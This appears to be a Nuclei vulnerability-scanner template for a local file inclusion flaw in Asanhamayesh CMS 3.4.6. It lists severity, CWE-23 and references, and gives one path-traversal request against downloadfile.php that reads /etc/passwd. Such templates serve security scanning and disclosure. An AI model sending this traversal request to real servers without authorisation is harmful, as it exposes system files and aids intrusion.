# Nuclei Template: Asanhamayesh CMS 3.4.6 - Local File Inclusion
**Template ID:** asanhamayesh-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`asanhamayesh-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/downloadfile.php?file=../../../../../../../../../../etc/passwd
```

## References
- https://cxsecurity.com/issue/WLB-2018030006
- https://asanhamayesh.com
